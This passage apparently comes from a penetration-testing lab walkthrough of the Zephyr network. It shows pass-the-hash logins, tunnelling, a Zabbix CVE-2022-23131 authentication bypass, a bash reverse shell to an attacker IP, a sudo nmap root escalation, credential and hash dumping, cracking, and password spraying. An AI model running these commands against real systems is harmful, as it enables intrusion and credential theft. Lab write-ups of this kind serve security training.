SMB         192.168.110.55  445    DC               ADMIN$                          Remote Admin
SMB         192.168.110.55  445    DC               C$                              Default share
SMB         192.168.110.55  445    DC               IPC$            READ            Remote IPC
SMB         192.168.110.55  445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.110.55  445    DC               SYSVOL          READ            Logon server share 
```

Let’s check their privileges on bloodhound:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2025.png)

Since we know matt is web server admin, let’s see if the same password is reused:

```bash
nxc smb dc.painters.htb -u matt -p '!QAZ1qaz' --shares

SMB         192.168.110.55  445    DC               [-] painters.htb\matt:!QAZ1qaz STATUS_LOGON_FAILURE 
```

Nope. Let’s also test on the Linux machine mail. Denied. 

Let’s enumerate other machines with web_svc.

Let’s enumerate DNS entries:

```bash
nxc ldap dc.painters.htb -u web_svc -p '!QAZ1qaz' -M get-network -o ALL=true

dc.painters.htb          192.168.110.55
Maintenance.painters.htb         192.168.110.10
PNT-SVRBPA.painters.htb          192.168.110.53
PNT-SVRPSB.painters.htb          192.168.110.54
PNT-SVRSVC.painters.htb          192.168.110.52
```

We find another host. Let’s add it to our /etc/hosts file

```bash
192.168.110.55 dc.painters.htb painters.htb        
192.168.110.10 Maintenance.painters.htb 
192.168.110.53 PNT-SVRBPA.painters.htb
192.168.110.54 PNT-SVRPSB.painters.htb
192.168.110.52 PNT-SVRSVC.painters.htb
```

 and scan it with nmap:

```bash
sudo nmap -sC -sV 192.168.110.10 -oN nmap/maintenance
```

Nothing. Let’s scan all ports:

```bash
sudo nmap --min-rate=10000 -p- -v 192.168.110.10 
```

Nothing.

Let’s scan for snmp:

```bash
sudo nmap -sU -p 161,162 192.168.110.10

PORT    STATE         SERVICE
161/udp open|filtered snmp
162/udp open|filtered snmptrap

```

No services are running?

Let’s check web_svc access to other machines:

```bash
nxc winrm 192.168.110.52 -u web_svc -p '!QAZ1qaz'

WINRM       192.168.110.52  5985   PNT-SVRSVC       [*] Windows Server 2022 Build 20348 (name:PNT-SVRSVC) (domain:painters.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)

nxc winrm 192.168.110.53 -u web_svc -p '!QAZ1qaz'
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\web_svc:!QAZ1qaz

nxc winrm 192.168.110.54 -u web_svc -p '!QAZ1qaz'
WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\web_svc:!QAZ1qaz

```

We can logon on PNT-SVRSVC at 192.168.110.52  via winrm.

Let’s also check riley’s before moving on:

```bash
nxc winrm 192.168.110.52 -u 'riley' -p 'P@ssw0rd'

WINRM       192.168.110.52  5985   PNT-SVRSVC       [-] painters.htb\riley:P@ssw0rd

nxc winrm 192.168.110.53 -u 'riley' -p 'P@ssw0rd'

WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\riley:P@ssw0rd

nxc winrm PNT-SVRPSB -u 'riley' -p 'P@ssw0rd'

WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\riley:P@ssw0rd
```

### Lateral Movement DC

Let’s login via evil-winrm, we got the NT hash of administrator from exploitation steps in SVRPBA.

```bash
evil-winrm -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71 -i dc.painters.htb
```

Let’s check what what’s on the DC. In C:\Program Files, we find:

```bash
cd "C:\Program Files"

dir

<SNIP>
d-----        10/21/2022  10:54 AM                Zabbix Agent
```

Let’s investigate:

```bash
cd "Zabix Agent"

dir

d-----        10/21/2022  10:54 AM                zabbix_agentd.d
-a----        10/21/2022  11:18 AM          15131 zabbix_agentd.conf
-a----          4/4/2022   3:02 PM        3182824 zabbix_agentd.exe
-a----        11/13/2025   3:07 AM          73143 zabbix_agentd.log
-a----          4/4/2022   3:03 PM        2859752 zabbix_get.exe
-a----          4/4/2022   3:03 PM        2912496 zabbix_sender.exe
```

```bash
zabbix_agentd.conf:

Server=192.168.110.55,192.168.210.13

zabbix_agentd.log:

  3804:20221021:105445.317 Starting Zabbix Agent [DC]. Zabbix 5.4.12 (revision 9bd5a418b8).                                                    
  3804:20221021:105445.320 **** Enabled features ****                                                                                          
  3804:20221021:105445.321 IPv6 support:          YES                                                                                          
  3804:20221021:105445.321 TLS support:           YES                                                                                          
  3804:20221021:105445.323 **************************                                                                                          
  3804:20221021:105445.324 using configuration file: C:\Program Files\Zabbix Agent\zabbix_agentd.conf                                          
  3804:20221021:105445.795 agent #0 started [main process]                                                                                     
  3860:20221021:105445.798 agent #1 started [collector]                                                                                        
  2480:20221021:105445.800 agent #2 started [listener #1]                                                                                      
  3080:20221021:105445.803 agent #3 started [listener #2]                                                                                      
  2768:20221021:105445.805 agent #4 started [listener #3]                                                                                      
  3948:20221021:105445.805 agent #5 started [active checks #1]                                                                                 
  3948:20221021:105447.836 active check configuration update from [192.168.110.55:10051] started to fail (cannot connect to [[192.168.110.55]:1
0051]: Connection refused.)                                                                                                                    
  2480:20221021:111549.475 failed to accept an incoming connection: connection from "192.168.210.13" rejected, allowed hosts: "192.168.110.55" 
  3080:20221021:111623.921 failed to accept an incoming connection: connection from "192.168.210.13" rejected, allowed hosts: "192.168.110.55" 
  2768:20221021:111625.424 failed to accept an incoming connection: connection from "192.168.210.13" rejected, allowed hosts: "192.168.110.55" 
  2768:20221021:111725.434 failed to accept an incoming connection: connection from "192.168.210.13" rejected, allowed hosts: "192.168.110.55" 
  2372:20221021:111819.743 Zabbix Agent stopped. Zabbix 5.4.12 (revision 9bd5a418b8).      
```

A lot of mention of 192.168.210.13 IP address.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2026.png)

Zabbix agent is a monitoring tool.

We can get the version of zabbix agent:

```bash
cd "C:\program files\zabbix agent"

.\zabbix_agentd.exe -V

zabbix_agentd Win64 (service) (Zabbix) 5.4.12
Revision 9bd5a418b8 4 April 2022, compilation time: Apr  4 2022 15:01:48

Copyright (C) 2022 Zabbix SIA
License GPLv2+: GNU GPL version 2 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it according to
the license. There is NO WARRANTY, to the extent permitted by law.

This product includes software developed by the OpenSSL Project
for use in the OpenSSL Toolkit (http://www.openssl.org/).

Compiled with OpenSSL 1.1.1k  25 Mar 2021
Running with OpenSSL 1.1.1k  25 Mar 2021
```

Another way to find other hosts, let’s take a look at network information:

```bash
netstat -ano

<SNIP>
  TCP    192.168.110.55:10050   192.168.210.13:59736   TIME_WAIT       0   
  TCP    192.168.110.55:10050   192.168.210.13:59744   TIME_WAIT       0   
  TCP    192.168.110.55:10050   192.168.210.13:59752   TIME_WAIT       0   
  TCP    192.168.110.55:10050   192.168.210.13:59756   TIME_WAIT       0   
  TCP    192.168.110.55:10050   192.168.210.13:59758   TIME_WAIT       0                            
  TCP    192.168.110.55:10050   192.168.210.13:59772   TIME_WAIT       0                            
  TCP    192.168.110.55:10050   192.168.210.13:59780   TIME_WAIT       0                            
  TCP    192.168.110.55:49667   192.168.110.51:36008   ESTABLISHED     1056 
```

Now let’s set up another ligolo tunnel, so we can reach the internal IP.

First, transfer the agent over:

```bash
upload agent.exe

.\agent.exe -connect 10.10.16.5:80 -ignore-cert

agent.exe : time="2025-11-13T15:45:21Z" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2025-11-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2025-11-13T15:45:21Z" level=info msg="Connection established" addr="10.10.16.5:80"

```

Now let’s set up a new interface:

```bash
#on localhost
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up

#back on local proxy session
session
start --tun ligolo-double

#now add route on localhost
sudo ip route add 192.168.210.0/24 dev ligolo-double
```

Now let’s test it out:

```bash
ping -c 1 192.168.210.13

PING 192.168.210.13 (192.168.210.13) 56(84) bytes of data.
64 bytes from 192.168.210.13: icmp_seq=1 ttl=64 time=75.8 ms

--- 192.168.210.13 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 75.818/75.818/75.818/0.000 ms

```

Let’s perform a ping sweep from our localhost:

```bash
for i in $(seq 254); do ping 192.168.210.$i -c1 -W1 & done | grep from

64 bytes from 192.168.210.1: icmp_seq=1 ttl=64 time=39.9 ms
64 bytes from 192.168.210.10: icmp_seq=1 ttl=64 time=54.1 ms
64 bytes from 192.168.210.13: icmp_seq=1 ttl=64 time=49.7 ms
64 bytes from 192.168.210.12: icmp_seq=1 ttl=64 time=50.0 ms

for i in $(seq 254); do ping 192.168.110.$i -c1 -W1 & done | grep from

64 bytes from 192.168.110.1: icmp_seq=1 ttl=64 time=35.1 ms
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=34.7 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=64 time=36.2 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=64 time=37.5 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=64 time=37.3 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=64 time=34.9 ms

```

There are three machines, not counting the gateway at .1. Let’s perform nmap scan on all three:

```bash
sudo nmap -iL internal_hosts -sC -sV -oN nmap/internal_hosts

sudo nmap -sC -sV 192.168.210.1
```

Let’s also do another ping sweep:

```bash
#first get a cmd.exe shell
upload rev_shell.exe

#on host
nc -lnvp 443

#on new cmd.exe sesssion
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 192.168.110.%a) | find "Reply"

Reply from 192.168.110.1: bytes=32 time<1ms TTL=64
Reply from 192.168.110.51: bytes=32 time<1ms TTL=64
Reply from 192.168.110.52: bytes=32 time<1ms TTL=128
Reply from 192.168.110.53: bytes=32 time=1ms TTL=128
Reply from 192.168.110.54: bytes=32 time<1ms TTL=128
Reply from 192.168.110.55: bytes=32 time<1ms TTL=128

```

Let’s get the network from ldap module in nxc:

```bash
nxc ldap 192.168.110.55 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 -M get-network

192.168.110.55
192.168.110.10
192.168.110.51
192.168.110.56
192.168.110.53
192.168.110.54
192.168.110.52
```

There is an extra machine. 

## 192.168.110.56 WORKSTATION-1

Let’s try to nmap scan it:

```bash
sudo nmap -sC -sV -Pn 192.168.110.56

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WORKSTATION-1.painters.htb
| Not valid before: 2025-12-01T06:24:02
|_Not valid after:  2026-06-02T06:24:02
|_ssl-date: 2025-12-02T21:16:28+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: PAINTERS
|   NetBIOS_Domain_Name: PAINTERS
|   NetBIOS_Computer_Name: WORKSTATION-1
|   DNS_Domain_Name: painters.htb
|   DNS_Computer_Name: WORKSTATION-1.painters.htb
|   DNS_Tree_Name: painters.htb
|   Product_Version: 10.0.19041
|_  System_Time: 2025-12-02T21:16:23+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
```

Since we are administrator, let’s just logon.

```bash
evil-winrm -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53 -i 192.168.110.56
```

We are in, and we got the flag.

## 192.168.210.13 Zabbix Server

```bash
Nmap scan report for 192.168.210.13
Host is up (0.0014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=monitor.zsm.local/organizationName=Zephyr Managed Services/stateOrProvinceName=London/countryName=GB
| Not valid before: 2022-03-21T19:39:06
|_Not valid after:  2032-03-18T19:39:06
| http-robots.txt: 2 disallowed entries
|_/ /zabbix/".
|_http-title: Zabbix
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit the web page:

```bash
https://192.168.210.13
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2027.png)

This is the zabbix agent. It monitors local resources and reports the collected data to the master server. Let’s try default password:

```bash
admin:admin
matt:L1f30f4Spr1ngCh1ck3n!
```

Does not work. We click on sign in with SSO:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2028.png)

Let’s add that to our /etc/hosts file:

```bash
192.168.210.13 adfs.zsm.local
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2029.png)

We get a 404 not found. 

From the DC machine, we know which version of zabbix agent this web is using, as from the configuration, this machine’s IP was defined in the zabbix_agentd.conf. 

```bash
LogFile=C:\Program Files\Zabbix Agent\zabbix_agentd.log
Server=192.168.110.55,192.168.210.13
ServerActive=192.168.110.55,192.168.210.13
Hostname=DC
Include=C:\Program Files\Zabbix Agent\zabbix_agentd.d\
```

Searching up zabbix 5.4.12 exploit, we come across this:

[https://github.com/Vulnmachines/Zabbix-CVE-2022-23131](https://github.com/Vulnmachines/Zabbix-CVE-2022-23131)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2030.png)

We find an exploit here:

https://github.com/Fa1c0n35/zabbix-cve-2022-23131?tab=readme-ov-file and the blog explaining it: https://www.sonarsource.com/blog/zabbix-case-study-of-unsafe-session-storage/

Let’s try the exploit out. 

```bash
python3 zabbix_session_exp.py -t https://192.168.210.13 -u admin
```

Did not work. Let’s find another exploit:

[https://github.com/fork-bombed/CVE-2022-23131/blob/main/cve-2022-23131.py](https://github.com/fork-bombed/CVE-2022-23131/blob/main/cve-2022-23131.py)

```bash
python3 cve-2022-23131.py https://192.168.210.13/               
[+] Generated authenticated zbx_session
[+] Testing zbx_session: https://192.168.210.13/index_sso.php

[+] Exploit was successful, here is your authenticated zbx_session:
        eyJzZXNzaW9uaWQiOiAiYTk0YWRkNTI4ZjNkYTNiZjUxYWVkMTM5YTIwMDhjYzQiLCAic2lnbiI6ICJtbTdrTHVFZmo1N3BUWFpNSmEyb3p5WDNVNEtObVdnYk9DOXc0TVI0Qy96K05DTWlXMkZHTmgyc29UdlRKUTMySW1XU2swTHhZNWhkcFdCWmRsNlpxZz09IiwgInNhbWxfZGF0YSI6IHsidXNlcm5hbWVfYXR0cmlidXRlIjogIkFkbWluIn19
```

It worked, we got an admin session cookie. Let’s edit our cookie with cookie editor on the web, after clicking save, click on single-sign on:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2031.png)

We are logged in as admin:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2032.png)

We click on hosts, we see all machines that the server is monitoring:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2033.png)

New hosts:

```bash
192.168.210.14 ZPH-SVRADFS1	
192.168.210.17 ZPH-SVRCHR	
192.168.210.18 ZPH-SVRCSUP	
192.168.210.11 ZPH-SVRMGMT1	
192.168.210.15 ZPH-SVRSQL01	
```

Let’s add those above to /etc/hosts file.

Let’s perfrom nmap scan on all the new hosts:

```bash
sudo nmap -iL zph_hosts -sC -sV -oN nmap/zph_scan
```

We also see a scripts section under Administration tab. It seems like we can execute shell code:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2034.png)

Let’s try creating a script and getting a shell back. 

An example of the script is:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2035.png)

To manually execute the script, we navigate to Monitoring → Hosts → now select the target host → click on our desired Script, in this case, is ping:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2036.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2037.png)

Let’s check another:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2038.png)

Ok, let’s test if our server is reachable:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2039.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2040.png)

Let’s determin the path of bash and sh:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2041.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2042.png)

```bash
/usr/bin/curl https://10.10.16.5

```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2043.png)

When we attempted the reverse shell, it just hangs forever. Maybe there are firewall rules that prevetnts outgoing to strange ports. Since our port 80 is already used. Let’s try port 443, a standard port for HTTPS

![image.png]({{ site.baseurl }}/assets/zephyr/image%2044.png)

It worked. Let’s try our reveres shell again:

```bash
/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.16.5/443 0>&1'
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2045.png)

Now we execute.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2046.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2047.png)

We now have shell.

### Privilege Escalation Zabbix Server

The weird thing was we could execute nmap without password. Let’s check our privileges:

```bash
zabbix@zephyr:/$ sudo -l
sudo -l
Matching Defaults entries for zabbix on zephyr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zabbix may run the following commands on zephyr:
    (root) NOPASSWD: /usr/bin/nmap
zabbix@zephyr:/$ id
id
uid=113(zabbix) gid=118(zabbix) groups=118(zabbix)

```

Let’s search up nmap in GTFObin to try and raise our privilege.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2048.png)

Let’s try the first one out:

```bash
TF=$(mktemp)
echo 'os.execute("/usr/bin/sh")' > $TF
sudo nmap --script=$TF
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2049.png)

We are now root. 

### Lateral Movement Zabbix Server

Checking /etc/ssh/sshd_config, root’s allowed to login:

```bash
/etc/ssh/sshd_config:

PermitRootLogin yes 
```

However, when we scanned with nmap, port 22 is filtered, so firewall is probably blocking it. Let’s just upgrade our shell and enumerate from there:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Checking our network information, we seem to be in a docker:

```bash
ifconfig

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:80:38:8a:81  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.210.13  netmask 255.255.255.0  broadcast 192.168.210.255
        inet6 fe80::250:56ff:fe94:9f4c  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:9f:4c  txqueuelen 1000  (Ethernet)
        RX packets 56850  bytes 6576451 (6.5 MB)
        RX errors 0  dropped 58  overruns 0  frame 0
        TX packets 77351  bytes 15016220 (15.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 64843  bytes 4122877 (4.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 64843  bytes 4122877 (4.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Let’s upload linpeas and execute it:

```bash
#on localhost
python3 -m http.server 443

#on target
wget http://10.10.16.5:443/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

Interesting outputs:

```bash
OS: Linux version 5.4.0-200-generic (buildd@lcy02-amd64-023) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #220-Ubuntu SMP Fri Sep 27 13:
19:16 UTC 2024                     
User & Groups: uid=0(root) gid=0(root) groups=0(root)
Hostname: zephyr  

╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Docker version ............... Client: Docker Engine - Community
═╣ Any running containers? ........ No

╔══════════╣ Searching mysql credentials and exec                                                                                              
We can read the mysql debian.cnf. You can use this username/password to log in MySQL                                                           
# Automatically generated for Debian scripts. DO NOT TOUCH!                                                                                    
[client]                                                                                                                                       
host     = localhost                                                                                                                           
user     = debian-sys-maint                                                                                                                    
password = cK8y5D1ydIXX3VCI                                                                                                                    
socket   = /var/run/mysqld/mysqld.sock                                                                                                         
[mysql_upgrade]                                                                                                                                
host     = localhost                                                                                                                           
user     = debian-sys-maint                                                                                                                    
password = cK8y5D1ydIXX3VCI                                                                                                                    
socket   = /var/run/mysqld/mysqld.sock                                                                                                         
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                
Found readable /etc/mysql/my.cnf                                                                                                               
!includedir /etc/mysql/conf.d/                                                                                                                 
!includedir /etc/mysql/mysql.conf.d/                                                                                                           
From '/var/lib/mysql/zabbix/media_type.ibd' Mysql user:                                                                                        
From '/var/lib/mysql/zabbix/hosts.ibd' Mysql user:  

╔══════════╣ Analyzing Zabbix Files (limit 70)                                                                                                 
-rw-r--r-- 1 root root 24437 Mar  1  2022 /usr/local/etc/zabbix_server.conf                                                                    
LogFile=/tmp/zabbix_server.log                                                                                                                 
DBName=zabbix                                                                                                                                  
DBUser=zabbix                                                                                                                                  
DBPassword=rDhHbBEfh35sMbkY                                            
Timeout=4                                                              
LogSlowQueries=3000                                                    
StatsAllowedIP=127.0.0.1

-rw-r--r-- 1 root root 15869 Oct 21  2022 /usr/local/etc/zabbix_agentd.conf
LogFile=/tmp/zabbix_agentd.log                                         
Server=127.0.0.1                                                       
ServerActive=127.0.0.1
Hostname=Zabbix server
-rw-r--r-- 1 root root 15588 Feb 24  2022 /var/lib/docker/overlay2/030cb647bc3beb4e1abb8dc30a40e56911ddca083c0c0327dd6578e0af49bafc/diff/etc/za
bbix/zabbix_agentd.conf                                                                                                                        
PidFile=/run/zabbix/zabbix_agentd.pid
LogFile=/var/log/zabbix/zabbix_agentd.log                       
LogFileSize=0                                                          
Server=172.17.0.1                                                                                                                              
ServerActive=172.17.0.1
Hostname=Zabbix server                                                                                                                         
Include=/etc/zabbix/zabbix_agentd.d/*.conf
TLSConnect=psk
TLSAccept=psk
TLSPSKIdentity=PSK 001
TLSPSKFile=/etc/zabbix/zabbix_agentd.psk
-rw-r--r-- 1 root root 15596 Feb 24  2022 /var/lib/docker/overlay2/54ad88c48fbb1b686b9f4d32a40a488767d04486e5a837d40e807fedecbe79bc/diff/etc/za
bbix/zabbix_agentd.conf
PidFile=/run/zabbix/zabbix_agentd.pid
LogFile=/var/log/zabbix/zabbix_agentd.log
LogFileSize=0
Server=127.0.0.1,172.17.0.1

```

Let’s perform ping sweep:

```bash
for i in $(seq 254); do ping 172.17.0.$i -c1 -W1 & done | grep from
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.057 ms

for i in $(seq 254); do ping 192.168.210.$i -c1 -W1 & done | grep from
64 bytes from 192.168.210.10: icmp_seq=1 ttl=128 time=0.443 ms
64 bytes from 192.168.210.12: icmp_seq=1 ttl=128 time=0.404 ms
64 bytes from 192.168.210.16: icmp_seq=1 ttl=128 time=0.988 ms
64 bytes from 192.168.210.13: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.210.1: icmp_seq=1 ttl=64 time=0.399 ms
```

Let’s attempt to crack root hash with hashcat:

```bash
cat /etc/shadow

root:$6$6f6giSmZBJf/.sxX$lxLJK6FwdiiKgWo593xCjV0yi2U29AU5d2v2tYLrnN8AoBKswgvSuQwKiUhSb3nEcDa4sbMTu2N/TRd304bgg0:19334:0:99999:7:::
```

```bash
.\hashcat.exe -m 1800 ..\hashes.txt ..\rockyou.txt
```

It’s not cracking. 

Let’s also login in mysql and see if there are any user information there. 

```bash
mysql -u zabbix -h localhost -p  #rDhHbBEfh35sMbkY

show databases;
use zabbix;
show tables;
select * from users;

Administrator:$2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q
#attempt_ip 192.168.210.100
guest:$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
marcus:$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.

```

Let’s attempt to crack all three:

```bash
.\hashcat.exe -m 3200 ..\hashes.txt ..\rockyou.txt

guest:$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06:
marcus:$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.:!QAZ2wsx
```

Administrator did not crack. Lets’ see if marcus is a domain account:

```bash
nxc smb zsm.local -u marcus -p '!QAZ2wsx' --shares

SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Enumerated shares
SMB         192.168.210.10  445    ZPH-SVRDC01      Share           Permissions     Remark
SMB         192.168.210.10  445    ZPH-SVRDC01      -----           -----------     ------
SMB         192.168.210.10  445    ZPH-SVRDC01      ADMIN$                          Remote Admin
SMB         192.168.210.10  445    ZPH-SVRDC01      C$                              Default share
SMB         192.168.210.10  445    ZPH-SVRDC01      IPC$            READ            Remote IPC
SMB         192.168.210.10  445    ZPH-SVRDC01      NETLOGON        READ            Logon server share
SMB         192.168.210.10  445    ZPH-SVRDC01      SYSVOL          READ            Logon server share
```

Success. Now we have a valid domain account. Continue exploitation on SVRDC01.

## 192.168.210.10 ZPH-SVRDC01

```bash
Nmap scan report for 192.168.210.10
Host is up (0.016s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2025-11-13T10:58:04
|_Not valid after:  2026-11-13T10:58:04
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2025-11-13T10:58:04
|_Not valid after:  2026-11-13T10:58:04
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2025-11-13T10:58:04
|_Not valid after:  2026-11-13T10:58:04
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2025-11-13T10:58:04
|_Not valid after:  2026-11-13T10:58:04
Service Info: Host: ZPH-SVRDC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

First, let’s add the domain name to our /etc/hosts file:

```bash
192.168.210.10 zsm.local ZPH-SVRDC01.zsm.local
```

Let’s find the hostname

```bash
nxc smb 192.168.210.10 -u '' -p '' --shares

SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\: 
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

We found our second DC

Let’s password spray from all the existing passwords we have:

```bash
nxc smb 192.168.210.10 -u users.txt -p pwds.txt --no-brute

nxc smb 192.168.210.10 -u users.txt -p pwds.txt --no-brute --local-auth
```

None.

From Zabbix Server, we got marcus’ creds. 

Let’s get the subdomains:

```bash
nxc ldap zsm.local -u marcus -p '!QAZ2wsx' -M get-network -o ALL=true

ZPH-SVRADFS1.zsm.local   192.168.210.14
ZPH-SVRSQL01.zsm.local   192.168.210.15
@.zsm.local      192.168.210.10
zph-svrdc01.zsm.local    192.168.210.10
ZPH-SVRCA01.zsm.local    192.168.210.12
```

Asreproast:

```bash
nxc ldap zsm.local -u jamie -p 'P@ass123' --asreproast zsm_asreproast.out
